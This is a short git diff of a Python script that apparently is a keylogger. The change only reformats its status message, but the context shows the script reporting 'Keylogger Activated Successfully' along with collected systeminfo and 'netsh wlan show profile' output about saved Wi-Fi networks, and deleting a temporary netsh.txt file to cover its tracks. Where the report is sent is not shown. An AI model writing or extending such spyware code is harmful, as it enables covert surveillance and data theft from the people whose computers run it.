@@ -18,7 +18,11 @@ def main():
                 file.close()
                 remove("netsh.txt")
 
-                msg = f"Keylogger Activated Successfully...\n\nsysteminfo:\n{systeminfo}\n\nnetsh:\n{netsh}"
+                msg = (
+                    f"Keylogger Activated Successfully...\n\n"
+                    f"systeminfo:\n{systeminfo}\n\n"
+                    f"netsh wlan show profile:\n{netsh}"
+                )
 
             else:
                 msg = "Keylogger Activated Successfully..."
